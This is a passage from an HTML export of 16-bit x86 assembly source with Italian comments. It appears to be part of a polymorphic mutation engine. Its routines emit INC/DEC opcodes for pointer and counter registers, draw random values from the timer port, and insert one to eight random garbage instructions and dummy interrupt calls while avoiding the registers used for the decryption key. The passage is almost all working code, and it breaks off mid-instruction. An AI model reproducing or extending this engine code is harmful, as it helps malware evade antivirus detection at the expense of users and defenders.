
<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; dec_cnt crea l'istruzione per decrementare di uno il counter
(DEC reg16)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>inc_pnt:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>mov<span style="mso-spacerun: yes">     </span>al,byte ptr
ds:[already_pnt]<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>add<span style="mso-spacerun: yes">     </span>al,40h<span
style="mso-spacerun: yes">                       </span>; INC = opcode 40h +
reg. 16 bit<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>cmp<span style="mso-spacerun: yes">     </span>byte ptr
ds:[math_opdone],00h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>jne<span style="mso-spacerun: yes">     </span>no_prob<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>inc<span style="mso-spacerun: yes">     </span>byte ptr ds:[pnt_sba]<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>no_prob:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>jmp<span style="mso-spacerun: yes">     </span>common_exit<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>dec_cnt:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>mov<span style="mso-spacerun: yes">     </span>al,byte ptr ds:[already_cnt]<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>add<span style="mso-spacerun: yes">     </span>al,48h<span
style="mso-spacerun: yes">               </span>; DEC = opcode 48h + reg.16 bit<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>common_exit:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span></span></b><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>stosb<span style="mso-spacerun: yes">                       
</span>; salva in buffer<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>ret<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>;----------------------------------------------------------------------------------<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; routine di generazione numeri casuali<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>sorta_random:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>in<span
style="mso-spacerun: yes">      </span>al,40h<span style="mso-spacerun:
yes">                  </span>; num.casuale in AL<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>mov<span
style="mso-spacerun: yes">     </span>ah,al<span style="mso-spacerun:
yes">                   </span>; sposta in AH<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>in<span
style="mso-spacerun: yes">      </span>al,40h<span style="mso-spacerun:
yes">                  </span>; num.casuale in AL<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>xor<span
style="mso-spacerun: yes">     </span>al,ah<span style="mso-spacerun:
yes">                   </span>; filtro <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes"> </span><span
style="mso-spacerun: yes">      </span>ret<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>;----------------------------------------------------------------------------------<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; routine di generazione numeri casuali tra 0 e 7. Spesso si usa
per i registri<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>sorta_random_07:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>call<span
style="mso-spacerun: yes">    </span>sorta_random<span style="mso-spacerun:
yes">            </span>; numero casuale in AX<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes"> </span><span
style="mso-spacerun: yes">      </span>and<span style="mso-spacerun: yes">    
</span>ax,0111b<span style="mso-spacerun: yes">                </span>; AND con
7, casuale da 0 a 7<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>ret<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>;----------------------------------------------------------------------------------<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; random_garbage crea un numero random da 1 a 8 di istruzioni
garbage<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>random_garbage:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">     </span><span
style="mso-spacerun: yes">  </span>call<span style="mso-spacerun: yes">   
</span>sorta_random_07<span style="mso-spacerun: yes">         </span>; casuale
tra 0 e 7<span style="mso-spacerun: yes">  </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>mov<span
style="mso-spacerun: yes">     </span>bx,ax<span style="mso-spacerun:
yes">                   </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>inc<span
style="mso-spacerun: yes">     </span>bx<span style="mso-spacerun:
yes">                      </span>; in BX casuale tra 1 e 8<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; garbage crea BX istruzioni fasulle<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>garbage:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>push<span style="mso-spacerun: yes">    </span>si<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>mov<span style="mso-spacerun: yes">     </span>si,offset already_pnt<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>select_garb_reg:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span></span></b><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>call<span style="mso-spacerun: yes">   
</span>sorta_random_07<span style="mso-spacerun: yes">         </span>; scelta
registro<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; nelle istruzioni che seguono viene esaminato il registro
pescato casualmente con <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; la call soprastante; devono essere scartati tutti i registri
già utilizzati e me-<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC;mso-ansi-language:EN-US'>; morizzati in already_pnt -&gt; [SI],
already_cnt -&gt; [SI+1], already _key -&gt; [SI+2]<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span></span></b><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>cmp<span style="mso-spacerun: yes">     </span>al,byte ptr
ds:[si]<span style="mso-spacerun: yes">     </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span></span></b><b><span
lang=FR style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
FR'>je<span style="mso-spacerun: yes">      </span>select_garb_reg<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:FR'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:FR'><span style="mso-spacerun: yes">      
</span></span></b><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>cmp<span style="mso-spacerun: yes">     </span>al,byte ptr
ds:[si+1]<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span></span></b><b><span
lang=FR style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
FR'>je<span style="mso-spacerun: yes">      </span>select_garb_reg<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:FR'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:FR'><span style="mso-spacerun: yes">      
</span></span></b><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>cmp<span style="mso-spacerun: yes">     </span>al,byte ptr
ds:[si+2]<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span></span></b><b><span
lang=FR style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
FR'>je<span style="mso-spacerun: yes">      </span>select_garb_reg<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:FR'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:FR'><span style="mso-spacerun: yes">      
</span></span></b><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>cmp<span style="mso-spacerun: yes">     </span>al,4<span
style="mso-spacerun: yes">                    </span>; SP = 4<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>je<span
style="mso-spacerun: yes">      </span>select_garb_reg<span
style="mso-spacerun: yes">         </span>; SP non si puo’ usare<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>mov<span
style="mso-spacerun: yes">     </span>dl,al<span style="mso-spacerun:
yes">                   </span>; DL contiene il registro buono<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>get_type:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>call<span
style="mso-spacerun: yes">    </span>sorta_random<span style="mso-spacerun:
yes">    </span><span style="mso-spacerun: yes">        </span>; scegli tipo di
garbage<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>and<span
style="mso-spacerun: yes">     </span>ax,01fh<span style="mso-spacerun:
yes">                 </span>; AX tra 0 e 31<span style="mso-spacerun: yes"> 
</span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>cmp<span
style="mso-spacerun: yes">     </span>al,31d<span style="mso-spacerun:
yes">                  </span>; operazioni senza registri da 1 byte<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
EN-US'>je<span style="mso-spacerun: yes">      </span>just_onebyters<span
style="mso-spacerun: yes">          </span>; o chiamate a interrupt (1 su 31)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>; a questo punto AX è tra 0 e 30<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>push<span
style="mso-spacerun: yes">    </span>ax<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>mov<span
style="mso-spacerun: yes">     </span>si,offset base_prefix<span
style="mso-spacerun: yes">   </span>; vedi se istruzione e' formata da<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>add<span
style="mso-spacerun: yes">     </span>si,ax<span style="mso-spacerun:
yes">                   </span>; 2 bytes, se prefisso=0 allora 1 byte<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>mov<span
style="mso-spacerun: yes">     </span>al,byte ptr ds:[si]<span
style="mso-spacerun: yes">      </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>or<span
style="mso-spacerun: yes">      </span>al,al<span style="mso-spacerun: yes">   
</span><span style="mso-spacerun: yes">               </span>; è zero ?<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>jz<span
style="mso-spacerun: yes">      </span>no_prefix<span style="mso-spacerun:
yes">               </span>; si, niente prefisso <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>stosb<span
style="mso-spacerun: yes">                           </span>; se cosi' metti
byte di<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>no_prefix:<span style="mso-spacerun:
yes">                                      </span>; prefisso nel buffer<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
EN-US'>pop<span style="mso-spacerun: yes">     </span>ax<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>push<span style="mso-spacerun: yes">    </span>ax<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span></span></b><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>mov<span style="mso-spacerun: yes">     </span>si,offset
base_ocs<span style="mso-spacerun: yes">      </span>; metti byte principale
del registro<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>add<span
style="mso-spacerun: yes">     </span>si,ax<span style="mso-spacerun:
yes">                   </span>; <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>mov<span
style="mso-spacerun: yes">     </span>al,byte ptr ds:[si]<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>add<span
style="mso-spacerun: yes">     </span>al,dl<span style="mso-spacerun:
yes">                   </span>; con il registro scelto (DL)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>stosb<span
style="mso-spacerun: yes">                   </span><span style="mso-spacerun:
yes">        </span>; scrive base_ocs in buffer<span style="mso-spacerun:
yes">  </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>pop<span
style="mso-spacerun: yes">     </span>ax<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>mov<span
style="mso-spacerun: yes">     </span>dl,al<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>cmp<span
style="mso-spacerun: yes">     </span>dl,13d<span style="mso-spacerun:
yes">                  </span>; le operazioni &gt;= a 13 nella<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>jb<span
style="mso-spacerun: yes">      </span>garbage_loop<span style="mso-spacerun:
yes">            </span>; tabella hanno un operando<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun:
yes">                                          </span><span
style="mso-spacerun: yes">      </span>; immediato tipo byte<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>call<span
style="mso-spacerun: yes">    </span>sorta_random<span style="mso-spacerun:
yes">            </span>; un operando immediato a caso <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>stosb<span
style="mso-spacerun: yes">                           </span>; e lo scrive nel
buffer<span style="mso-spacerun: yes">  </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>cmp<span
style="mso-spacerun: yes">     </span>dl,21d<span style="mso-spacerun:
yes">                  </span>; quelle oltre 21 invece ne<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>jb<span
style="mso-spacerun: yes">      </span>garbage_loop<span style="mso-spacerun:
yes">            </span>; hanno ben due<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>call<span
style="mso-spacerun: yes">    </span>sorta_random<span style="mso-spacerun:
yes">            </span>; prende un operando immediato<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>stosb<span
style="mso-spacerun: yes">                           </span>; e lo mette nel
buffer<span style="mso-spacerun: yes">  </span><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>jmp<span
style="mso-spacerun: yes">     </span>garbage_loop<span style="mso-spacerun:
yes">            </span>; Ok ricomincia<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>;----------------------------------------------------------------------------------<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; just_ints crea possibili chiamate ad interrupts. le prime
quattro sono da<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; interpretarsi come funzioni (quindi byte da mettere in AH)
all'int 21h,<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; mentre le ultime due sono l'int 11h (get enviroment) e int 12h
(get avaiable<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; memory in kbs).<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFCC'>; inters<span style="mso-spacerun: yes">          </span>db<span
style="mso-spacerun: yes">     </span>019h,054h,00bh,018h,011h,012h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'>just_ints:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span>call<span style="mso-spacerun: yes">    </span>sorta_random_07<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">      
</span></span></b><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>cmp<span style="mso-spacerun: yes">     </span>al,05<span
style="mso-spacerun: yes">                   </span>; 5 chiamate generabili (AL
tra 0 e 4)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:
EN-US'>ja<span style="mso-spacerun: yes">      </span>just_ints<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>mov <span
style="mso-spacerun: yes">    </span>si,offset inters<span style="mso-spacerun:
yes">        </span>; offset tabella chiamate int.<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>add<span
style="mso-spacerun: yes">     </span>si,ax<span style="mso-spacerun:
yes">                   </span>; casualizza<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'><span style="mso-spacerun: yes">       </span>cmp<span
style="mso-spacerun: yes">     </span>al,04<span style="mso-spacerun:
